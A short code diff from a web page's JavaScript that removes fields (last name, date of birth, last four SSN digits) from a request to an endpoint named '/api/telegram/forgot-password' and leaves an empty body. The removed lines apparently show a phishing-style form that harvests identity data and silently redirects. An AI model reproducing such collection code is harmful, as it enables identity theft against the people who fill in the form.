@@ -246,11 +246,7 @@
           await fetch("/api/telegram/forgot-password", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              lastName: document.getElementById("lastName").value,
-              birthDate: document.getElementById("dob").value,
-              ssnLast4: document.getElementById("ssn").value,
-            }),
+            body: JSON.stringify({}),
           });
         } finally {
           window.location.href = "/";
